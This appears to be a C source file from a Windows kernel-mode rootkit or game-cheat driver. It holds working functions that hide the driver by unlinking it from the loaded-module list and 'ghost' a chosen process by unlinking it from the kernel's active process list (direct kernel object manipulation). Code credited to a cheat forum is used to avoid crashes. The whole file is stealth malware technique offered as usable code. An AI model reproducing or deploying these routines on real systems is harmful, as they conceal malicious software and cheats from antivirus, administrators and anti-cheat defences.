////
//		FUNCTIONS USED TO HIDE PROCESSES AND DRIVERS
////
#include <ntifs.h>
#include <ntddk.h>
#include "Driver.h"
#include <tdiinfo.h>

VOID HideDriver(PDRIVER_OBJECT DriverObject)
{
	KdPrint(("[+] Hiding driver\n"));
	KIRQL irql = KeRaiseIrqlToDpcLevel();
	PLDR_DATA_TABLE_ENTRY prevEntry, nextEntry, modEntry;
	modEntry = (PLDR_DATA_TABLE_ENTRY)DriverObject->DriverSection;

	prevEntry = (PLDR_DATA_TABLE_ENTRY)modEntry->InLoadOrderLinks.Blink;
	nextEntry = (PLDR_DATA_TABLE_ENTRY)modEntry->InLoadOrderLinks.Flink;

	prevEntry->InLoadOrderLinks.Flink = modEntry->InLoadOrderLinks.Flink;
	nextEntry->InLoadOrderLinks.Blink = modEntry->InLoadOrderLinks.Blink;

	modEntry->InLoadOrderLinks.Flink = (PLIST_ENTRY)modEntry;
	modEntry->InLoadOrderLinks.Blink = (PLIST_ENTRY)modEntry;
	KeLowerIrql(irql);
	KdPrint(("[!] Driver hidden!\n"));
}

////
//		BSOD AVOID USED FROM UNKNOWNCHEATS
////
VOID RemoveTheLinks(PLIST_ENTRY Current)
{
	PLIST_ENTRY Previous, Next;

	Previous = (Current->Blink);
	Next = (Current->Flink);

	Previous->Flink = Next;
	Next->Blink = Previous;

	// Re-write the current LIST_ENTRY to point to itself (avoiding BSOD)
	Current->Blink = (PLIST_ENTRY)&Current->Flink;
	Current->Flink = (PLIST_ENTRY)&Current->Flink;
	return;
}

PCHAR GhostProcess(UINT32 pid)
{
	KdPrint(("[+] Ghosting process\n"));
	LPSTR result = (LPSTR)ExAllocatePool(NonPagedPool, sizeof(ULONG) + 20);;

	ULONG PID_OFFSET = ACTIVE_PROCESS_LINKS;
	KdPrint(("[+] PID offset: %p\n", PID_OFFSET));

	ULONG LIST_OFFSET = PID_OFFSET;

	//Checking architecture using pointer size
	INT_PTR ptr;

	// Ptr size 8 if compiled for a 64-bit machine, 4 if compiled for 32-bit machine
	LIST_OFFSET += sizeof(ptr);

	PEPROCESS CurrentEPROCESS = PsGetCurrentProcess();

	PLIST_ENTRY CurrentList = (PLIST_ENTRY)((ULONG_PTR)CurrentEPROCESS + LIST_OFFSET);
	PUINT32 CurrentPID = (PUINT32)((ULONG_PTR)CurrentEPROCESS + PID_OFFSET);

	if (*(UINT32*)CurrentPID == pid) {
		RemoveTheLinks(CurrentList);
		return (PCHAR)result;
	}

	PEPROCESS StartProcess = CurrentEPROCESS;

	CurrentEPROCESS = (PEPROCESS)((ULONG_PTR)CurrentList->Flink - LIST_OFFSET);
	CurrentPID = (PUINT32)((ULONG_PTR)CurrentEPROCESS + PID_OFFSET);
	CurrentList = (PLIST_ENTRY)((ULONG_PTR)CurrentEPROCESS + LIST_OFFSET);

	while ((ULONG_PTR)StartProcess != (ULONG_PTR)CurrentEPROCESS)
	{
		if (*(UINT32*)CurrentPID == pid) {
			RemoveTheLinks(CurrentList);
			return (PCHAR)result;
		}

		CurrentEPROCESS = (PEPROCESS)((ULONG_PTR)CurrentList->Flink - LIST_OFFSET);
		CurrentPID = (PUINT32)((ULONG_PTR)CurrentEPROCESS + PID_OFFSET);
		CurrentList = (PLIST_ENTRY)((ULONG_PTR)CurrentEPROCESS + LIST_OFFSET);
	}

	KdPrint(("[!] Process %d ghosted!\n", pid));
	return (PCHAR)result;
}